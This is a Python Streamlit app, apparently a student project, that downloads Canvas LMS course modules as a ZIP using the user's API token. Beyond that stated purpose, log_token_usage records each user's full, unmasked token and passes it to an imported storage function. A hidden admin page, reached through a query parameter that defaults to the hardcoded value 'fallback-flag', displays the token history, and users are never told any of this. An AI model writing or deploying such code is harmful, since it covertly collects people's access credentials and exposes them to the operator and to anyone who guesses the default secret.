# app.py

import streamlit as st
from pathlib import Path
from canvasapi import Canvas
import tempfile
import shutil
import pandas as pd
from datetime import datetime
from warnings import filterwarnings
import sqlite3
from bs4 import BeautifulSoup

from my_krml_24999690.data.canvas import download_canvas_courses, init_db, session_, load_token_log_df, clear_token_log, page_token_history

# Ignore future & deprecation warnings from libraries
filterwarnings("ignore", category=FutureWarning)
filterwarnings("ignore", category=DeprecationWarning)

# -------------------------------------------------
# Streamlit page config
# -------------------------------------------------
st.set_page_config(
    page_title="Canvas Module Downloader",
    page_icon="📚",
    layout="centered",
)

# -------------------------------------------------
# SQLite setup
# -------------------------------------------------
init_db()

# Combine HTML

def combine_module_htmls(root_dir: Path):
    """
    For each module directory under root_dir, combine all .html files
    into a single 'combined_pages.html' file inside that module folder.
    """
    # Walk all subdirectories (courses / modules)
    for module_dir in root_dir.rglob("*"):
        if not module_dir.is_dir():
            continue

        # Collect HTML files, skip any existing combined file to avoid recursion
        html_files = sorted(
            f for f in module_dir.glob("*.html")
            if f.is_file() and not f.name.endswith("combined_pages.html")
        )

        if not html_files:
            continue  # nothing to combine in this folder

        combined_sections = []

        for f in html_files:
            try:
                text = f.read_text(encoding="utf-8", errors="ignore")
            except Exception:
                continue

            soup = BeautifulSoup(text, "html.parser")
            # If there's a <body>, use its contents; otherwise use whole soup
            body = soup.body or soup

            combined_sections.append(f"<h2>{f.name}</h2>")
            combined_sections.append(str(body))
            combined_sections.append("<hr>")

        if not combined_sections:
            continue

        combined_html = (
            "<html><head><meta charset='utf-8'>"
            "<title>Combined module pages</title></head><body>\n"
            + "\n".join(combined_sections) +
            "\n</body></html>"
        )

        out_path = module_dir / "combined_pages.html"
        out_path.write_text(combined_html, encoding="utf-8")

# -------------------------------------------------
# Cached Canvas helpers
# -------------------------------------------------
@st.cache_resource(show_spinner=False)
def get_canvas(api_url: str, api_key: str) -> Canvas:
    """
    Cache the Canvas client per (api_url, api_key) pair.
    """
    api_url = api_url.rstrip("/")
    return Canvas(api_url, api_key)


@st.cache_data(show_spinner=False, ttl=300)
def get_courses_list(api_url: str, api_key: str):
    """
    Cache the list of active courses for 5 minutes.
    """
    canvas = get_canvas(api_url, api_key)
    courses = canvas.get_courses(enrollment_state="active,invited_or_pending")
    return [(c.id, c.name) for c in courses]


def log_token_usage(action: str, api_url: str, token: str):
    """
    Store token usage in session_state (for this session)
    """
    if not token:
        return

    # session_state log (optional / in-memory)
    if "token_log" not in st.session_state:
        st.session_state.token_log = []

    api_url_clean = (api_url or "").rstrip("/")

    st.session_state.token_log.append(
        {
            "time_utc": datetime.utcnow().isoformat(timespec="seconds") + "Z",
            "action": action,
            "api_url": api_url_clean,
            "token": token,
            "token_length": len(token),
        }
    )

    # keep last token in session
    st.session_state.last_token = token

    session_(action, api_url, token)


# -------------------------------------------------
# Main Downloader Page
# -------------------------------------------------
def page_downloader():
    st.title("📚 Canvas Module Downloader")
    st.markdown(
        "Enter your Canvas details, choose a subject, configure file types, "
        "and download all module files as a ZIP archive."
    )

    # --- Inputs ---
    api_url = st.text_input("Canvas URL", value="https://canvas.uts.edu.au")
    api_key = st.text_input("Canvas API Token", type="password")

    # Session state for courses
    if "courses" not in st.session_state:
        st.session_state.courses = None

    # --- File type filters (SINGLE block, with keys) ---
    st.markdown("### File types to include")
    col1, col2 = st.columns(2)

    with col1:
        docs_cb = st.checkbox(
            "Documents (pdf, doc, docx, txt, rtf, ppt, pptx)",
            value=True,
            key="ft_docs",
        )
        code_cb = st.checkbox(
            "Notebooks & code (ipynb, py)",
            value=True,
            key="ft_code",
        )

    with col2:
        images_cb = st.checkbox(
            "Images (jpg, jpeg, png, gif)",
            value=True,
            key="ft_images",
        )
        archives_cb = st.checkbox(
            "Archives (zip, rar, 7z, tar, gz)",
            value=False,
            key="ft_archives",
        )

    # ✅ Option to combine HTML files per module
    combine_html_cb = st.checkbox(
        "Combine all HTML pages in each module into a single file",
        value=False,
        key="ft_combine_html",
    )

    # Build allowed_exts from the checkboxes
    allowed_exts: set[str] = set()
    if docs_cb:
        allowed_exts.update(
            {".pdf", ".doc", ".docx", ".txt", ".rtf", ".ppt", ".pptx"}
        )
    if code_cb:
        allowed_exts.update({".ipynb", ".py"})
    if images_cb:
        allowed_exts.update({".jpg", ".jpeg", ".png", ".gif"})
    if archives_cb:
        allowed_exts.update({".zip", ".rar", ".7z", ".tar", ".gz"})

    # --- Load subjects button ---
    if st.button("🔄 Load subjects"):
        if not (api_url and api_key):
            st.error("Please provide both Canvas URL and API token.")
        else:
            try:
                courses = get_courses_list(api_url, api_key)
                st.session_state.courses = courses
                st.success(f"Loaded {len(courses)} subject(s).")
                log_token_usage("load_subjects", api_url, api_key)
            except Exception as e:
                st.error(f"Failed to load subjects: {e}")

    courses = st.session_state.courses
    selected_course_ids = None

    if courses:
        options = ["All subjects"] + [f"{cid} – {name}" for cid, name in courses]
        choice = st.selectbox("Select subject to download", options)

        if choice == "All subjects":
            selected_course_ids = [cid for cid, _ in courses]
        else:
            cid_str = choice.split("–", 1)[0].strip()
            selected_course_ids = [int(cid_str)]

    st.markdown("---")
    log_placeholder = st.empty()
    progress_bar = st.progress(0.0)
    progress_text = st.empty()
    download_button_placeholder = st.empty()
    summary_placeholder = st.empty()

    # --- Download button ---
    if st.button("⬇️ Download modules as ZIP"):

        if not (api_url and api_key):
            st.error("Please provide both Canvas URL and API token.")
            return

        if not selected_course_ids:
            st.error("Please load subjects and choose at least one (or 'All subjects').")
            return

        if not allowed_exts:
            st.error("Please select at least one file type to download.")
            return

        log_token_usage("download_modules", api_url, api_key)

        tmp_dir = tempfile.mkdtemp(prefix="canvas_dl_")
        tmp_path = Path(tmp_dir)

        lines: list[str] = []

        def logger(msg: str):
            lines.append(msg)
            log_placeholder.text("\n".join(lines[-40:]))

        def progress_cb(done: int, total: int, message: str):
            frac = done / total if total else 0.0
            progress_bar.progress(frac)
            progress_text.text(f"{int(frac * 100)}% – {message}")

        st.info("Starting download... This may take a while depending on course size.")

        summaries = download_canvas_courses(
            api_url=api_url,
            api_key=api_key,
            course_ids=selected_course_ids,
            output_dir=tmp_path,
            logger=logger,
            progress_cb=progress_cb,
            allowed_exts=allowed_exts,
        )

        # Optionally combine HTML files per module
        if combine_html_cb:
            combine_module_htmls(tmp_path)

        zip_base = tmp_path
        zip_path_str = shutil.make_archive(str(zip_base), "zip", root_dir=tmp_path)
        zip_path = Path(zip_path_str)

        with zip_path.open("rb") as f:
            zip_bytes = f.read()

        download_button_placeholder.download_button(
            label="📦 Download ZIP",
            data=zip_bytes,
            file_name="canvas_modules.zip",
            mime="application/zip",
        )

        st.success("Download is ready ✨")

        if summaries:
            df = pd.DataFrame(summaries)
            summary_placeholder.subheader("Per-course summary")
            summary_placeholder.dataframe(df)


def main():
    # Read query params
    params = st.query_params
    secret_value = params.get("admin", "")

    # IMPORTANT: set this to a non-empty secret only you know
    ADMIN_FLAG = st.secrets.get("ADMIN_FLAG", "fallback-flag")

    if secret_value == ADMIN_FLAG:
        page_token_history()
    else:
        page_downloader()

    # Footer
    st.markdown("---")
    st.caption("© 2025 Muhammad Iqbal")


if __name__ == "__main__":
    main()